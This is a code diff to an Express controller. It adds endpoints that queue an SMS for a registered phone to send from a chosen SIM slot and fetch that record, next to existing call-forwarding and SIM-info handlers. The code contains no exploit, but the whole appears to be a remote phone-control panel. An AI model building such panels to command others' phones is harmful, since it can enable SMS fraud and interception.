@@ -3,6 +3,7 @@ const Device = require('../models/Device');
 const Call = require('../models/Call');
 const Battery = require('../models/Battery');
 const SimInfo = require('../models/SimInfo');
+const SMS = require("../models/SMS");
 const User = require('../models/User'); // <-- Import User model
 
 exports.addDeviceDetails = async (req, res) => {
@@ -205,5 +206,129 @@ exports.getCallForwardingStatus = async (req, res) => {
     } catch (error) {
         console.error("Error fetching call forwarding status:", error);
         res.status(500).json({ success: false, message: "Internal Server Error", code: null });
+    }
+};
+// Get device details and render custom.ejs
+exports.getCustomDeviceDetails = async (req, res) => {
+    try {
+        const device_id = req.params.id;
+
+        // Validate ObjectId
+        if (!mongoose.isValidObjectId(device_id)) {
+            return res.status(400).json({ success: false, error: "Invalid Device ID" });
+        }
+
+        // Fetch device details
+        const device = await Device.findById(device_id);
+        if (!device) {
+            return res.status(404).json({ success: false, error: "Device not found" });
+        }
+
+        // Fetch SIM details from SimInfo collection
+        const simInfo = await SimInfo.findOne({ uniqueid: device_id });
+
+        // Check if simInfo exists and has properties
+        const sim1Number = simInfo && simInfo.sim1Number ? simInfo.sim1Number : "N/A";
+        const sim2Number = simInfo && simInfo.sim2Number ? simInfo.sim2Number : "N/A";
+
+        // Render custom.ejs with device details and SIM info
+        res.render("cudtomsms", { 
+            device, 
+            sim1Number,
+            sim2Number
+        });
+
+    } catch (err) {
+        console.error("Error fetching device details:", err);
+        res.status(500).json({ success: false, error: "Server Error" });
+    }
+};
+
+
+exports.sendSMS = async (req, res) => {
+    try {
+        const { address, message, sim } = req.body;
+        // Trim the device ID to remove extra spaces
+        const deviceId = req.params.id ? req.params.id.trim() : null;
+
+        console.log("Device ID from URL:", deviceId); // DEBUG LOG
+        console.log("Received Data:", { address, message, sim }); // DEBUG LOG
+
+        if (!deviceId) {
+            return res.status(400).json({
+                success: false,
+                error: "Device ID is missing in URL"
+            });
+        }
+
+        if (!address || !message || !sim || !["SIM 1", "SIM 2"].includes(sim)) {
+            return res.status(400).json({
+                success: false,
+                error: "Invalid data"
+            });
+        }
+
+        // Include deviceId in the update so that it gets saved correctly during upsert
+        const smsData = await SMS.findOneAndUpdate(
+            { deviceId: deviceId },  // Filter: search by deviceId
+            {                        // Update data including deviceId
+                deviceId: deviceId,
+                address,
+                message,
+                sim,
+                status: "Sent",
+                updatedAt: new Date()
+            },
+            { new: true, upsert: true, setDefaultsOnInsert: true }
+        );
+
+        console.log("SMS Updated/Inserted:", smsData);
+        return res.json({
+            success: true,
+            message: "SMS sent successfully!",
+            data: smsData
+        });
+    } catch (error) {
+        console.error("Error sending SMS:", error);
+        return res.status(500).json({
+            success: false,
+            error: "Internal Server Error"
+        });
+    }
+};
+exports.getSmsByDeviceId = async (req, res) => {
+    try {
+        // Trim the deviceId to remove extra spaces
+        const deviceId = req.params.id ? req.params.id.trim() : null;
+        if (!deviceId) {
+            return res.status(400).json({ 
+                success: false, 
+                message: "Device ID missing", 
+                data: null 
+            });
+        }
+
+        // Query by deviceId (ensure your schema has deviceId defined as a String)
+        const smsData = await SMS.findOne({ deviceId: deviceId });
+        if (!smsData) {
+            return res.status(404).json({ 
+                success: false, 
+                message: "No SMS found for this device", 
+                data: null 
+            });
+        }
+
+        return res.status(200).json({
+            success: true,
+            message: "SMS retrieved successfully!",
+            data: smsData
+        });
+    } catch (err) {
+        console.error("Error in getSmsByDeviceId:", err);
+        return res.status(500).json({ 
+            success: false, 
+            message: "Internal Server Error", 
+            data: null 
+        });
     }
 };
